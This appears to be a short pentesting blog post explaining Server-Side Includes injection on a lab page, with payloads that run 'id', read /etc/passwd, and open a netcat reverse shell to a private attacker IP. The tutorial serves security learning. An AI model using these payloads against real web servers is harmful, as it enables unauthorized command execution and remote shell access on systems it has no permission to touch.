---
layout: post
title: Server-Side Includes (SSI) Injection
categories:
  - Web-Pentesting
---

<p>SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user.</p>
<br>The Server-Side Includes attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely. It can be exploited through manipulation of SSI in use in the application or force its use through user input fields.
<br>To check first put some name in the field

![43](https://teckk2.github.io/assets/images/Web%20Pentest/A1/43.png)
![44](https://teckk2.github.io/assets/images/Web%20Pentest/A1/44.png)
<br>It's showing our input name and our machine IP
![45](https://teckk2.github.io/assets/images/Web%20Pentest/A1/45.png)
<br>But if you focus in the URL it’s not html it’s shtml that’s because it’s using server side include, now because of this we can try server side include injection on this
![46](https://teckk2.github.io/assets/images/Web%20Pentest/A1/46.png)
<br><font color="Green"> <!--#exec cmd="id"--> </font>
<br>Yes, this looks like a comment in HTML/XML but it’s not! This SSI varies from server to server(Linux to Windows).
We
![47](https://teckk2.github.io/assets/images/Web%20Pentest/A1/47.png)
<br>We got RCE from this
<br>You can also try few other commands also
<br><font color="Green"> <!--#echo var="DATE_LOCAL" --> </font>
<br><font color="Green"> <!--#exec cmd="cat /etc/passwd"--> </font>
<br>**Getting shell from RCE**
![48](https://teckk2.github.io/assets/images/Web%20Pentest/A1/48.png)
<br><font color="Green"> <!--#exec cmd="nc -nv 192.168.140.136 4455 -e /bin/bash"--> </font>
![49](https://teckk2.github.io/assets/images/Web%20Pentest/A1/49.png)

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
